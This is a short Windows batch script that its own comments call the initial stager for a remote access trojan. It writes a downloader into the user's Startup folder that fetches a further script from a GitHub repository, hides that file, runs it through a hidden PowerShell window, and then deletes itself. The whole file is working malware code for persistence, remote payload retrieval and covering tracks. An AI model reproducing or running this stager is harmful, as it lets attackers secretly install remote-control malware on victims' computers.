@echo off
REM initial stager for RAT 
REM created by :CHEPHYTY
REM move into startup directory

REM variables 
REM INITIALPATH capture the current path of the dir
set "INITIALPATH=%cd%" 
REM STARTUP capture the path of the microsoft startup file
set "STARTUP=%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup"

REM move into startup directory
cd /d "%STARTUP%"

REM TODO: Build out stage two
REM write payloads to startup
(echo powershell -c "Invoke-WebRequest -Uri 'https://raw.githubusercontent.com/CHEPHYTY/MK1-Ratatouille/main/files/wget.cmd' -Outfile wget.cmd") > wget.cmd

REM hide the wget.cmd file
attrib +h wget.cmd

REM run payload
@REM powershell -windowstyle hidden -Command "Start-Process cmd.exe -ArgumentList '/c %STARTUP%\wget.cmd' -WindowStyle Hidden"
powershell -windowstyle hidden -Command "Start-Process powershell.exe 'wget.cmd -WindowStyle Hidden"
REM cd back into initial location
cd /d "%INITIALPATH%"

REM self-delete without error message
start /b "" cmd /c del "%~f0"&exit
